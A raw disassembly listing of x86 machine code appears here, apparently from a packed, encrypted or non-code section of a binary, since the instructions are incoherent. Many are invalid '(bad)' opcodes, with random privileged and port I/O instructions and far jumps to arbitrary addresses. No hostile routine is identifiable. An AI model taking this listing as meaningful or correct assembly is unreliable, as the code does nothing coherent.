  4172a9:	mov    dh,0x70
  4172ab:	and    BYTE PTR [edi+0x56],bh
  4172ae:	arpl   WORD PTR [eax+0x18],bx
  4172b1:	sub    ebx,edx
  4172b3:	pop    ecx
  4172b4:	arpl   dx,si
  4172b6:	push   ecx
  4172b7:	fmul   st,st(6)
  4172b9:	pop    ecx
  4172ba:	jle    0x4172a7
  4172bc:	aas    
  4172bd:	xchg   BYTE PTR [ecx-0x8],ch
  4172c0:	jae    0x417282
  4172c2:	pop    esi
  4172c3:	loopne 0x4172f1
  4172c5:	in     al,dx
  4172c6:	sub    ebx,DWORD PTR [ebx-0x38a2be70]
  4172cc:	mov    al,ds:0x1d4af2ec
  4172d1:	lds    eax,FWORD PTR [ecx]
  4172d3:	pop    ebx
  4172d4:	sub    eax,0xf7ebc3b5
  4172d9:	test   BYTE PTR [edx-0x64c37787],dh
  4172df:	cli    
  4172e0:	mov    cl,BYTE PTR [edi]
  4172e2:	repz (bad) 
  4172e4:	scas   al,BYTE PTR es:[edi]
  4172e5:	retf   0xbc74
  4172e8:	mov    ebp,0x582803a3
  4172ed:	cmp    ah,BYTE PTR [ecx+0x47f6958e]
  4172f3:	jmp    0x417332
  4172f5:	jbe    0x41732e
  4172f7:	and    eax,0x4d775160
  4172fc:	inc    ebp
  4172fd:	add    al,0x2b
  4172ff:	adc    eax,0xa3f5eff2
  417304:	adc    bh,dl
  417306:	test   DWORD PTR [ecx+0x26d32bc4],0x4da7407b
  417310:	jmp    0xf112bf0c
  417315:	push   edx
  417316:	repz and DWORD PTR [ecx+ebp*2-0x716e0285],0x43021f82
  417322:	pop    esi
  417323:	(bad)  
  417324:	sti    
  417325:	or     ebp,ebp
  417327:	or     dl,BYTE PTR [edi-0x3]
  41732a:	rcl    dl,0xd8
  41732d:	sbb    BYTE PTR [eax+0xc],al
  417330:	or     eax,0x4afc3aad
  417335:	aad    0x1b
  417337:	out    dx,al
  417338:	inc    esi
  417339:	push   0x38be7014
  41733e:	aam    0x3d
  417340:	sbb    DWORD PTR [eax-0x2e],edi
  417343:	int3   
  417344:	pop    ebp
  417345:	mov    bl,0x97
  417347:	fdiv   DWORD PTR [ecx-0x22]
  41734a:	(bad)
  41734d:	ret    
  41734e:	push   0x5c
  417350:	cld    
  417351:	(bad)  
  417352:	jmp    esi
  417354:	add    eax,0x38c155f3
  417359:	mov    ecx,0x8ac8d020
  41735e:	in     eax,dx
  41735f:	add    DWORD PTR [ebp-0x42],eax
  417362:	retf   
  417363:	test   DWORD PTR [edx-0x8d01d7e],edx
  417369:	cs mov bh,0x46
  41736c:	cmp    ecx,ecx
  41736e:	in     al,dx
  41736f:	loop   0x417363
  417371:	push   0x6f88fde9
  417376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417377:	imul   ebp,DWORD PTR [eax-0x6e],0x56
  41737b:	mov    ds:0xd903f4d0,al
  417380:	mov    dh,0x3b
  417382:	pop    ss
  417383:	and    DWORD PTR [ecx+0x4e],esp
  417386:	sub    dl,BYTE PTR cs:[ecx+0x10dd2a9e]
  41738d:	(bad)  
  41738e:	test   eax,0xd43b1590
  417393:	adc    al,0x59
  417395:	das    
  417396:	gs mov ch,0x7c
  417399:	ret    
  41739a:	push   ebx
  41739b:	cmp    BYTE PTR [edx],ah
  41739d:	sub    al,0xad
  41739f:	pop    ecx
  4173a0:	add    BYTE PTR [ecx-0xb],0xb9
  4173a4:	push   edx
  4173a5:	out    dx,al
  4173a6:	pusha  
  4173a7:	je     0x41741b
  4173a9:	cmp    eax,0x474276fa
  4173ae:	std    
  4173af:	inc    esp
  4173b0:	cmp    bh,BYTE PTR [eax-0x2d]
  4173b3:	retf   0x7107
  4173b6:	and    eax,0x6c059103
  4173bb:	sub    DWORD PTR [edx-0x2],ecx
  4173be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173bf:	xor    esi,edx
  4173c1:	adc    edx,ebp
  4173c3:	je     0x4173e9
  4173c5:	das    
  4173c6:	in     eax,0x44
  4173c8:	mov    edi,0x3e1b88d3
  4173cd:	fmul   st(7),st
  4173cf:	xchg   esi,eax
  4173d0:	cmp    ah,BYTE PTR [ebx+0x2f3ad582]
  4173d6:	jg     0x4173a0
  4173d8:	cs or  eax,0xb351ba02
  4173de:	retf   0x1ff5
  4173e1:	mov    eax,ds:0x978fa80c
  4173e6:	cli    
  4173e7:	int    0xa8
  4173e9:	clc    
  4173ea:	(bad)  
  4173eb:	jge    0x417409
  4173ed:	sub    BYTE PTR ds:0xaae88822,ch
  4173f3:	shl    DWORD PTR [ebp+0x72fa96dc],1
  4173f9:	pop    ebp
  4173fa:	(bad)  
  4173fb:	(bad)  
  4173fc:	jo     0x4173ac
  4173fe:	fcomi  st,st(7)
  417400:	mov    eax,ds:0xe9f184ca
  417405:	adc    eax,0x4f189de4
  41740a:	iret   
  41740b:	fsubr  DWORD PTR [ebx-0x6c]
  41740e:	bound  edx,QWORD PTR [ebx]
  417410:	aad    0x32
  417412:	mov    bl,0xbb
  417414:	js     0x4173f1
  417416:	mov    ebx,0x7a91d18f
  41741b:	xchg   edx,eax
  41741c:	mov    bl,BYTE PTR [ecx]
  41741e:	mov    dl,0xa
  417420:	in     al,0x3d
  417422:	xchg   ebx,eax
  417423:	mov    dh,0xc0
  417425:	cmp    eax,0xece980bb
  41742a:	aaa    
  41742b:	pop    edi
  41742c:	mov    ds:0x9199fd3f,eax
  417431:	mov    esi,0x614ee0bc
  417436:	inc    ecx
  417437:	pop    ss
  417438:	std    
  417439:	es xchg ebx,eax
  41743b:	rol    DWORD PTR [ecx+0xe06607f],1
  417441:	dec    ecx
  417442:	inc    eax
  417443:	cmp    edx,DWORD PTR [edi+ecx*2-0x3f]
  417447:	lds    ebx,FWORD PTR [edx-0x47bf7f8]
  41744d:	push   ebp
  41744e:	arpl   WORD PTR [ebp-0x27],sp
  417451:	test   DWORD PTR ss:[ebx-0x71b19b9],esi
  417458:	inc    ebx
  417459:	jle    0x4174a6
  41745b:	jbe    0x4174c5
  41745d:	lds    eax,FWORD PTR [esi-0x106e8ad9]
  417463:	fnstcw WORD PTR [eax+0x733bfb57]
  417469:	rcr    bl,1
  41746b:	sbb    cl,BYTE PTR [eax-0x19ba63af]
  417471:	retfw  0xaec
  417475:	jns    0x417464
  417477:	pop    ss
  417478:	or     ebp,eax
  41747a:	(bad)  
  41747b:	jnp    0x4174c3
  41747d:	ja     0x417479
  41747f:	xchg   edx,eax
  417480:	test   eax,0xc1e61562
  417485:	mov    BYTE PTR [edi+ebx*8-0x6e393580],bl
  41748c:	outs   dx,DWORD PTR ds:[esi]
  41748d:	shl    BYTE PTR [ebx+0x2f59531c],1
  417493:	jno    0x417476
  417495:	sbb    esp,DWORD PTR [ecx+ebp*1]
  417498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417499:	mov    ds:0x11c4979f,al
  41749e:	add    cl,BYTE PTR [esi+0x71]
  4174a1:	jmp    0x31e50daa
  4174a6:	pop    ebp
  4174a7:	std    
  4174a8:	cdq    
  4174a9:	mov    esp,0xf6f785f3
  4174ae:	jnp    0x4174f5
  4174b0:	sub    eax,0x7de4c255
  4174b5:	push   eax
  4174b6:	rcr    edx,0xdf
  4174b9:	cdq    
  4174ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174bb:	cmp    DWORD PTR [edx-0x4a],edi
  4174be:	(bad)  
  4174bf:	repnz sti 
  4174c1:	test   BYTE PTR [esi+ebp*2],cl
  4174c4:	gs aad 0xb
  4174c7:	stc    
  4174c8:	pushf  
  4174c9:	ins    BYTE PTR es:[edi],dx
  4174ca:	(bad)  
  4174cb:	aaa    
  4174cc:	xchg   ebx,ebx
  4174ce:	(bad)  
  4174cf:	aas    
  4174d0:	sti    
  4174d1:	mov    ebp,0x98ca3778
  4174d6:	test   DWORD PTR [ebx],edi
  4174d8:	shl    DWORD PTR [ebp+0x7b827cf1],cl
  4174de:	push   ebp
  4174df:	cmp    al,0xd4
  4174e1:	mov    dh,0xb5
  4174e3:	lods   eax,DWORD PTR ds:[esi]
  4174e4:	dec    edx
  4174e5:	cmc    
  4174e6:	push   ebx
  4174e7:	push   edx
  4174e8:	cmp    edx,DWORD PTR [edx+eiz*8-0x3c]
  4174ec:	test   DWORD PTR [edx-0x2cb6b30f],0xf279fa82
  4174f6:	or     BYTE PTR [ecx+0x2e],dh
  4174f9:	pop    eax
  4174fa:	gs jns 0x417503
  4174fd:	and    al,0x79
  4174ff:	out    0x2d,al
  417501:	mov    ds:0xeb33ac2,al
  417506:	mov    ebx,ebx
  417508:	shr    DWORD PTR [eax+edi*1+0x3939f3dc],0x13
  417510:	pop    ss
  417511:	jmp    0x8204:0x83d341eb
  417518:	cmp    dl,BYTE PTR ds:0xce9a9ecd
  41751e:	enter  0xe84b,0x2b
  417522:	push   0x45
  417524:	and    DWORD PTR es:[ecx+eax*4+0x2e],0x6454247f
  41752d:	outs   dx,DWORD PTR ds:[esi]
  41752e:	jbe    0x4174b6
  417530:	adc    DWORD PTR [esi+0x5a],esp
  417533:	pushf  
  417534:	cdq    
  417535:	ins    BYTE PTR es:[edi],dx
  417536:	stc    
  417537:	and    BYTE PTR [edi+0x10],dh
  41753a:	scas   eax,DWORD PTR es:[edi]
  41753b:	mov    ch,0x55
  41753d:	add    al,0xf5
  41753f:	je     0x417540
  417541:	stos   BYTE PTR es:[edi],al
  417542:	mov    DWORD PTR [esi],ecx
  417544:	in     eax,0x97
  417546:	add    al,0x28
  417548:	mov    al,ds:0x3061c5e0
  41754d:	shr    ebx,cl
  41754f:	pop    esp
  417550:	clts   
  417552:	pop    edi
  417553:	pop    edx
  417554:	push   0xf59d15e1
  417559:	xchg   edi,eax
  41755a:	xchg   ecx,eax
  41755b:	imul   ebx,ebp,0xb29818c6
  417561:	dec    edi
  417562:	adc    BYTE PTR [eax+0x1c],cl
  417565:	sti    
  417566:	jmp    0x785f31fb
  41756b:	mov    eax,ds:0x6ce4b54b
  417570:	push   es
  417571:	shl    BYTE PTR [ebx+eiz*4-0x74],1
  417575:	lods   eax,DWORD PTR ds:[esi]
  417576:	inc    edx
  417577:	mov    ah,0xc9
  417579:	push   DWORD PTR [ecx-0x77a92957]
  41757f:	data16 cs loope 0x417515
  417583:	das    
  417584:	outs   dx,DWORD PTR ds:[esi]
  417585:	fstp   TBYTE PTR [edi+0x4ed55a08]
  41758b:	push   ebp
  41758c:	fstp   st(1)
  41758e:	push   eax
  41758f:	leave  
  417590:	dec    ebx
  417591:	inc    ecx
  417592:	add    eax,0x6e9c21d0
  417597:	pop    esp
  417598:	repz ret 
  41759a:	cld    
  41759b:	mov    ecx,0xe9c6e94a
  4175a0:	les    edi,FWORD PTR [ebp+0x1c]
  4175a3:	xchg   ebx,eax
  4175a4:	cwde   
  4175a5:	test   BYTE PTR [eax],0xa5
  4175a8:	and    al,0x73
  4175aa:	fadd   DWORD PTR [edx+ecx*2]
  4175ad:	out    dx,eax
  4175ae:	rol    BYTE PTR [edx+0x57a45ed0],0x6f
  4175b5:	pop    eax
  4175b6:	and    ah,0x80
  4175b9:	xchg   esp,eax
  4175ba:	adc    dh,cl
  4175bc:	adc    eax,0x4707d006
  4175c1:	cmp    ebp,ecx
  4175c3:	dec    edx
  4175c4:	mov    dl,0xf4
  4175c6:	pop    edx
  4175c7:	enter  0xdab7,0x65
  4175cb:	pop    eax
  4175cc:	daa    
  4175cd:	popa   
  4175ce:	ret    
  4175cf:	add    cl,BYTE PTR [ebx]
  4175d1:	inc    esp
  4175d2:	dec    ecx
  4175d3:	mov    eax,ds:0xd8453ec
  4175d8:	xor    eax,ebp
  4175da:	push   0x52
  4175dc:	jnp    0x4175bb
  4175de:	lods   al,BYTE PTR ds:[esi]
  4175df:	outs   dx,BYTE PTR ds:[esi]
  4175e0:	call   0x6ea0:0x9cb95fab
  4175e7:	iret   
  4175e8:	sub    cl,al
  4175ea:	cmp    al,0x3
  4175ec:	mov    BYTE PTR [edx],cl
  4175ee:	pop    esp
  4175ef:	sbb    eax,0x886609ab
  4175f4:	fucomip st,st(6)
  4175f6:	repz pop ecx
  4175f8:	repnz xor DWORD PTR [ebx-0x3d],esp
  4175fc:	push   ebp
  4175fd:	cs std 
  4175ff:	loope  0x417617
  417601:	es (bad) 
  417606:	in     al,dx
  417607:	inc    edi
  417608:	fisttp DWORD PTR [ebx*2-0x23c4e6]
  41760f:	xor    cl,dh
  417611:	mov    al,0x3a
  417613:	push   cs
  417614:	pusha  
  417615:	mov    dl,0xcb
  417617:	hlt    
  417618:	(bad)  [edx-0x75]
  41761b:	repz push edx
  41761d:	sbb    esp,ebp
  41761f:	test   eax,0x8b68a5fa
  417624:	adc    DWORD PTR [ebp-0x6a],edx
  417627:	not    BYTE PTR [edi+0x3c]
  41762a:	in     eax,dx
  41762b:	jp     0x417632
  41762d:	imul   ebp,DWORD PTR [eax-0x2],0x8f81f067
  417634:	cmc    
  417635:	mov    ecx,0xe688a6b9
  41763a:	pop    DWORD PTR [ecx+0x53485ac0]
  417640:	jmp    DWORD PTR [esi]
  417642:	xchg   edx,eax
  417643:	jno    0x417685
  417645:	(bad)  
  417646:	sahf   
  417647:	mov    ah,0x9
  417649:	pop    es
  41764a:	xchg   ebx,eax
  41764b:	and    eax,0x8cf13543
  417650:	es ss pop eax
  417653:	lock sbb eax,0xffffffed
  417657:	pop    esi
  417658:	fs cmp BYTE PTR fs:[edx+0x765458a],ch
  417660:	xlat   BYTE PTR ds:[ebx]
  417661:	out    0xa0,eax
  417663:	stos   BYTE PTR es:[edi],al
  417664:	sbb    DWORD PTR [eax+0x1a],esp
  417667:	fldcw  WORD PTR [ebx+0x7a11fc36]
  41766d:	icebp  
  41766e:	scas   eax,DWORD PTR es:[edi]
  41766f:	imul   ecx,DWORD PTR [ebx+0x135a08ba],0x77a0114b
  417679:	retf   
  41767a:	daa    
  41767b:	fisttp QWORD PTR [ebp+eax*4+0x7e]
  41767f:	cmp    DWORD PTR [esi-0x1729fd26],esi
  417685:	pop    ebx
  417686:	sbb    eax,0x8bbaa950
  41768b:	push   esi
  41768c:	inc    edx
  41768d:	(bad)  
  41768e:	or     al,0xa4
  417690:	fidiv  DWORD PTR [edi+0x545844a]
  417696:	push   esp
  417697:	hlt    
  417698:	sbb    DWORD PTR [edx-0xbba2964],edi
  41769e:	cmp    eax,0x3e9a4ad
  4176a3:	pop    DWORD PTR [ebx]
  4176a5:	mov    ch,0xe5
  4176a7:	jp     0x41762d
  4176a9:	icebp  
  4176aa:	and    bl,BYTE PTR [ebp+0x3d]
  4176ad:	mov    edi,0xb86bcf7
  4176b2:	jo     0x41766e
  4176b4:	fimul  DWORD PTR [ebp+0x5504764e]
  4176ba:	or     DWORD PTR [eax+0xe],esi
  4176bd:	jg     0x417695
  4176bf:	and    esi,DWORD PTR [ebp-0x397ff003]
  4176c5:	ret    0x779b
  4176c8:	imul   eax,DWORD PTR [edi-0x7f9b86ef],0xffffffb1
  4176cf:	shl    DWORD PTR [ecx+0x2cd925e0],1
  4176d5:	inc    esp
  4176d6:	mov    dh,0x9e
  4176d8:	sub    esi,edi
  4176da:	xor    esp,DWORD PTR [edi+0x2]
  4176dd:	mov    dh,0x2f
  4176df:	mov    ebx,0x49639def
  4176e4:	jl     0x417673
  4176e6:	loopne 0x417710
  4176e8:	(bad)  
  4176e9:	cli    
  4176ea:	lods   eax,DWORD PTR ds:[esi]
  4176eb:	mov    al,0x85
  4176ed:	or     edi,DWORD PTR ss:[ebx+0x78]
  4176f1:	xchg   BYTE PTR [ebp+0x5a6c77fd],al
  4176f7:	jmp    0xefff18ac
  4176fc:	xor    BYTE PTR [ebx-0x3a141dfe],ch
  417702:	jae    0x417752
  417704:	inc    ecx
  417705:	mov    dl,0xc8
  417707:	repnz xchg ebx,eax
  417709:	call   0xee6f:0xc20d048
  417710:	cmp    DWORD PTR [ebx-0x3f],0x1f49945a
  417717:	scas   eax,DWORD PTR es:[edi]
  417718:	nop
  417719:	dec    ecx
  41771a:	dec    esp
  41771b:	ins    BYTE PTR es:[edi],dx
  41771c:	sub    WORD PTR [edx+0x43],dx
  417720:	sar    DWORD PTR [ebx+0x2aac1955],1
  417726:	and    esp,eax
  417728:	sbb    dh,ah
  41772a:	iret   
  41772b:	jmp    0x1aa64ae1
  417730:	mov    dl,bh
  417732:	scas   al,BYTE PTR es:[edi]
  417733:	cli    
  417734:	inc    esp
  417735:	xchg   esi,eax
  417736:	jecxz  0x4176e5
  417738:	add    DWORD PTR [ecx+ecx*1-0x5d8090c1],ecx
  41773f:	add    BYTE PTR [ebx],0x9b
  417742:	pop    edi
  417743:	jmp    0x417714
  417745:	sbb    DWORD PTR [esi-0x470d67],ebp
  41774b:	bound  esi,QWORD PTR ds:0x6fe4a2ed
  417751:	outs   dx,DWORD PTR ds:[esi]
  417752:	sub    bh,ah
  417754:	jb     0x4176eb
  417756:	and    BYTE PTR [eax-0x37],dh
  417759:	dec    ebx
  41775a:	test   ah,0xa5
  41775d:	mov    bl,cl
  41775f:	enter  0x6bb0,0xea
  417763:	imul   eax,esp,0xd57d8112
  417769:	xor    bl,BYTE PTR [ecx-0x799e15e8]
  41776f:	fsubp  st(3),st
  417771:	add    ah,dh
  417773:	pop    ss
  417774:	mov    ch,0xa3
  417776:	xchg   esp,eax
  417777:	add    al,0x9b
  417779:	(bad)
  41777e:	adc    DWORD PTR [esi+ebp*1],esp
  417781:	push   eax
  417782:	int3   
  417783:	push   0xffffffef
  417785:	fnstsw WORD PTR [edi-0x2bd403ca]
  41778b:	inc    DWORD PTR ds:0xc409c3f3
  417791:	push   esi
  417792:	clc    
  417793:	mov    BYTE PTR [ecx-0x49798ddb],dh
  417799:	lds    edi,FWORD PTR ds:0x3d138a1f
  41779f:	neg    DWORD PTR [ebp-0x61]
  4177a2:	inc    ebx
  4177a3:	xor    ebx,ebx
  4177a5:	xchg   DWORD PTR [ecx+edx*2+0x39adfb3e],ecx
  4177ac:	cli    
  4177ad:	lock (bad) 
  4177af:	neg    BYTE PTR [ebp+0x5ff5f9b9]
  4177b5:	retf   0x353e
  4177b8:	xor    dl,bh
  4177ba:	jae    0x41780f
  4177bc:	in     al,0x1f
  4177be:	sbb    edx,ebp
  4177c0:	jb     0x417758
  4177c2:	dec    ebp
  4177c3:	adc    esi,ecx
  4177c5:	das    
  4177c6:	cmp    edx,ebp
  4177c8:	test   eax,0xf476ad52
  4177cd:	mov    ah,0x60
  4177cf:	jb     0x4177ef
  4177d1:	out    dx,al
  4177d2:	jbe    0x41784e
  4177d4:	mov    ch,0xde
  4177d6:	pop    eax
  4177d7:	jle    0x417836
  4177d9:	sbb    eax,0x90c4cd89
  4177de:	mov    esi,ebx
  4177e0:	daa    
  4177e1:	out    dx,al
  4177e2:	scas   al,BYTE PTR es:[edi]
  4177e3:	fcmovnu st,st(1)
  4177e5:	in     al,dx
  4177e6:	jl     0x4177ea
  4177e8:	adc    DWORD PTR [eax],esi
  4177ea:	dec    ecx
  4177eb:	cmp    eax,0x143ce408
  4177f0:	jae    0x41785d
  4177f2:	sub    bh,bh
  4177f4:	add    esi,DWORD PTR [edx+0x2]
  4177f7:	jl     0x417788
  4177f9:	mov    edi,0x650a12bd
  4177fe:	mov    esp,0x6b6e8107
  417803:	ret    0x6a02
  417806:	ds jle 0x417815
  417809:	ror    BYTE PTR es:[ebp+0x3b],0x4a
  41780e:	push   esi
  41780f:	mov    ch,0x8a
  417811:	ds scas al,BYTE PTR es:[edi]
  417813:	sub    esp,ebp
  417815:	outs   dx,BYTE PTR ds:[esi]
  417816:	mov    al,ds:0x324c5290
  41781b:	bound  esi,QWORD PTR [eax]
  41781d:	ins    DWORD PTR es:[edi],dx
  41781e:	cmp    bl,BYTE PTR [esi-0x1d]
  417821:	outs   dx,DWORD PTR ds:[esi]
  417822:	sbb    ebp,ebx
  417824:	mov    ecx,DWORD PTR [eax-0x9756e52]
  41782a:	pop    edi
  41782b:	aaa    
  41782c:	sub    BYTE PTR ds:0x85f2ba11,0xc3
  417833:	rcr    BYTE PTR [edx+0x56],cl
  417836:	inc    esp
  417837:	mov    eax,ds:0x7fe2a33
  41783c:	or     BYTE PTR [esi-0x3],0xfd
  417840:	xchg   edx,eax
  417841:	out    0xcf,al
  417843:	mov    BYTE PTR [eax],al
  417845:	push   ebx
  417846:	popf   
  417847:	or     dl,ch
  417849:	test   al,0xba
  41784b:	xchg   BYTE PTR ds:0x5d8e6107,al
  417851:	ror    BYTE PTR [esi-0x6f6839b3],0x69
  417858:	mov    DWORD PTR [esi],ebp
  41785a:	mov    eax,ds:0x33e7fc41
  41785f:	xor    al,0x7f
  417861:	mov    WORD PTR [esi-0x56],gs
  417864:	fwait
  417865:	mov    eax,ds:0x7d942276
  41786a:	jno    0x41789b
  41786c:	jmp    0x4178cf
  41786e:	jbe    0x4178e2
  417870:	xchg   BYTE PTR [esi-0x6886d09c],al
  417876:	add    eax,ebx
  417878:	push   esi
  417879:	sbb    DWORD PTR [edx-0x637ffba9],ebp
  41787f:	adc    BYTE PTR [ecx],0x53
  417882:	lods   eax,DWORD PTR ds:[esi]
  417883:	enter  0x7ad9,0xc5
  417887:	sbb    ah,BYTE PTR [esi-0x95c8185]
  41788d:	retf   
  41788e:	fild   WORD PTR [eax+0x1d]
  417891:	cdq    
  417892:	loopne 0x4178e3
  417894:	push   eax
  417895:	or     dh,BYTE PTR [ebx-0x7c]
  417898:	and    ah,cl
  41789a:	xor    al,BYTE PTR [ecx-0x3a]
  41789d:	and    DWORD PTR [ebp-0x3],ebp
  4178a0:	fdivr  st(5),st
  4178a2:	xor    eax,esi
  4178a4:	dec    edi
  4178a5:	pop    edx
  4178a6:	cdq    
  4178a7:	js     0x41782f
  4178a9:	imul   eax,edx,0x2946b8ae
  4178af:	pushf  
  4178b0:	popa   
  4178b1:	sbb    edi,ebx
  4178b3:	(bad)  
  4178b4:	in     al,0xde
  4178b6:	cwde   
  4178b7:	dec    edx
  4178b8:	lea    ebp,[edx]
  4178ba:	mov    bh,0xcd
  4178bc:	add    BYTE PTR [edi+0x6d],dl
  4178bf:	mov    dh,al
  4178c1:	(bad)  
  4178c2:	imul   dh
  4178c4:	add    DWORD PTR [ebx-0x79],edx
  4178c7:	int3   
  4178c8:	iret   
  4178c9:	push   eax
  4178ca:	sbb    al,0xda
  4178cc:	cli    
  4178cd:	loop   0x417940
  4178cf:	adc    al,0x93
  4178d1:	sbb    DWORD PTR [edi],ebp
  4178d3:	adc    BYTE PTR [ebp-0x850885d],bh
  4178d9:	push   es
  4178da:	dec    edi
  4178db:	xlat   BYTE PTR ds:[ebx]
  4178dc:	mov    bh,0x4c
  4178de:	xchg   ebp,eax
  4178df:	inc    ebx
  4178e0:	cmp    BYTE PTR [esi-0x19],ch
  4178e3:	cmp    al,cl
  4178e5:	mov    edx,0x9f411fb2
  4178ea:	test   BYTE PTR [ecx-0x7873b952],0xd2
  4178f1:	sbb    DWORD PTR [bp+si+0x3deb],esi
  4178f6:	jmp    0x4a8f:0xdc266da3
  4178fd:	pop    ds
  4178fe:	pop    ecx
  4178ff:	sbb    BYTE PTR [eax],bh
  417901:	and    eax,0xa6a5240
  417906:	mov    ch,0xb5
  417908:	push   ds
  417909:	xor    dl,BYTE PTR [edx]
  41790b:	mov    ds,WORD PTR [esi-0xd86d060]
  417911:	or     bl,BYTE PTR [edx]
  417913:	mov    BYTE PTR [ecx+0x6d7c64d2],al
  417919:	xor    eax,0xb8b5c976
  41791e:	cmp    BYTE PTR [ebx+0x2093f316],cl
  417924:	mov    bl,0xba
  417926:	lea    edi,[eax+eiz*2]
  417929:	(bad)  
  41792a:	pop    ecx
  41792b:	push   ds
  41792c:	xchg   ebp,eax
  41792d:	dec    ebp
  41792e:	pop    esi
  41792f:	test   DWORD PTR [esi-0x18],edx
  417932:	imul   ebx,DWORD PTR [esi-0x433e6822],0xffffffdf
  417939:	mov    dl,0x18
  41793b:	sbb    BYTE PTR [edi+0x2d21f65f],dl
  417941:	jge    0x417968
  417943:	push   ds
  417944:	xchg   ebx,eax
  417945:	adc    al,0x93
  417947:	int    0x93
  417949:	ret    0xe43
  41794c:	sbb    bh,BYTE PTR ss:[ecx-0xd]
  417950:	sbb    DWORD PTR [ecx-0x31],eax
  417953:	lds    eax,FWORD PTR [ebx]
  417955:	sbb    al,0xe2
  417957:	arpl   si,dx
  417959:	ja     0x4179da
  41795b:	adc    eax,0x202c4ea1
  417960:	or     DWORD PTR [esi+0x42],ecx
  417963:	test   eax,0x9137308e
  417968:	or     BYTE PTR fs:[ebx-0x6f],bl
  41796c:	loopne 0x4179b8
  41796e:	jo     0x417966
  417970:	push   es
  417971:	retf   
  417972:	outs   dx,DWORD PTR ds:[esi]
  417973:	xchg   ebx,eax
  417974:	inc    esi
  417975:	repnz (bad) 
  417978:	dec    esi
  417979:	das    
  41797a:	mov    ch,0x74
  41797c:	into   
  41797d:	jmp    0x8413:0x512b8bb7
  417984:	inc    ecx
  417985:	push   eax
  417986:	inc    ebp
  417987:	jecxz  0x417923
  417989:	in     eax,0x96
  41798b:	or     DWORD PTR [ebx-0x7],edi
  41798e:	cmp    eax,0x8369897e
  417993:	aam    0x92
  417995:	push   ds
  417996:	push   ebp
  417997:	enter  0x2dd7,0x2a
  41799b:	outs   dx,BYTE PTR ds:[esi]
  41799c:	and    esp,eax
  41799e:	sbb    al,0x50
  4179a0:	xchg   esi,eax
  4179a1:	pop    esi
  4179a2:	sub    eax,0x115439fc
  4179a7:	in     eax,0xdc
  4179a9:	in     eax,dx
  4179aa:	lock sar ebx,1
  4179ad:	fimul  WORD PTR [ebx-0x4d]
  4179b0:	jmp    0xb475e14c
  4179b5:	or     DWORD PTR [ebp+0x79],edx
  4179b8:	xor    al,0xb8
  4179ba:	xchg   ebp,eax
  4179bb:	cmp    eax,0x1cb509f6
  4179c0:	adc    bl,BYTE PTR [esp+esi*2]
  4179c3:	mov    WORD PTR [eax],cs
  4179c5:	xor    DWORD PTR [ecx],ecx
  4179c7:	cmp    eax,0x6a1a841f
  4179cc:	adc    DWORD PTR [edx],ebx
  4179ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179cf:	pushf  
  4179d0:	aaa    
  4179d1:	mov    al,bh
  4179d3:	jge    0x41799d
  4179d5:	or     bl,BYTE PTR [edi]
  4179d7:	(bad)  
  4179d8:	and    ah,BYTE PTR ss:[ebx-0x631b1f3]
  4179df:	bswap  eax
  4179e1:	jp     0x417966
  4179e3:	jmp    0x2a38:0x488f9881
  4179ea:	add    DWORD PTR [ecx-0x1a972bfc],esp
  4179f0:	fst    QWORD PTR [ecx+0x16]
  4179f3:	mov    ah,0x44
  4179f5:	xchg   edx,eax
  4179f6:	pop    edx
  4179f7:	adc    BYTE PTR [ebx+0x1269218],bl
  4179fd:	loopne 0x4179da
  4179ff:	in     eax,dx
  417a00:	dec    edx
  417a01:	sbb    eax,0xe3b931ea
  417a06:	mov    edi,0x60de67fb
  417a0b:	outs   dx,DWORD PTR ds:[esi]
  417a0c:	xchg   esp,eax
  417a0d:	retf   0x28c8
  417a10:	shr    esp,1
  417a12:	dec    ebp
  417a13:	cmp    ebx,edx
  417a15:	inc    ebx
  417a16:	xor    bh,BYTE PTR [edx-0x66]
  417a19:	dec    ebx
  417a1a:	imul   edi,ebx,0x3b4e6eba
  417a20:	xchg   BYTE PTR [ebx+0x3a1be868],cl
  417a26:	xor    BYTE PTR [eax+esi*4],ah
  417a29:	and    BYTE PTR [edi-0x64],0xde
  417a2d:	xor    BYTE PTR [eax+ebp*4-0x15f7a517],cl
  417a34:	fcom   QWORD PTR [eax]
  417a36:	mov    al,0x2f
  417a38:	or     cl,BYTE PTR [esi]
  417a3a:	test   DWORD PTR [ebp-0x57],edx
  417a3d:	xor    al,0x42
  417a3f:	sub    eax,DWORD PTR [ecx-0x26]
  417a42:	pusha  
  417a43:	cli    
  417a44:	and    al,0x7a
  417a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a48:	dec    ecx
  417a49:	lds    edi,FWORD PTR [ecx+0x5]
  417a4c:	cld    
  417a4d:	outs   dx,DWORD PTR ds:[esi]
  417a4e:	enter  0xce29,0x8
  417a52:	mov    eax,0x8285b08b
  417a57:	mov    ebx,0x33676253
  417a5c:	test   eax,0x9e6dc789
  417a61:	rcl    BYTE PTR [ebx+0x5c],0xbb
  417a65:	mov    dl,0xde
  417a67:	mov    eax,0xdb24e90c
  417a6c:	loope  0x417a80
  417a6e:	adc    eax,0xe3050a23
  417a73:	mov    ah,0xde
  417a75:	xchg   ebp,edi
  417a77:	test   BYTE PTR [ecx+0x13b2fd4e],bl
  417a7d:	lods   eax,DWORD PTR ds:[esi]
  417a7e:	fild   DWORD PTR [esi-0x32f1cb78]
  417a84:	jge    0x417a7b
  417a86:	(bad)  
  417a87:	push   ds
  417a88:	std    
  417a89:	jmp    0x417a98
  417a8b:	and    edi,DWORD PTR [edx]
  417a8d:	adc    BYTE PTR [esi+0x3b],0x2c
  417a91:	in     eax,dx
  417a92:	stos   BYTE PTR es:[edi],al
  417a93:	push   esp
  417a94:	adc    BYTE PTR [ebx+0x6a],dl
  417a97:	dec    esi
  417a98:	arpl   WORD PTR [esi+0x46],bp
  417a9b:	and    BYTE PTR [edx-0x6b94e441],0x6c
  417aa2:	jno    0x417a97
  417aa4:	daa    
  417aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa6:	retf   0xd8bb
  417aa9:	cli    
  417aaa:	test   ecx,esi
  417aac:	icebp  
  417aad:	fwait
  417aae:	icebp  
  417aaf:	aad    0x78
  417ab1:	or     DWORD PTR [ebp+0x32],0x3
  417ab5:	imul   ecx,esi,0xbb71e53e
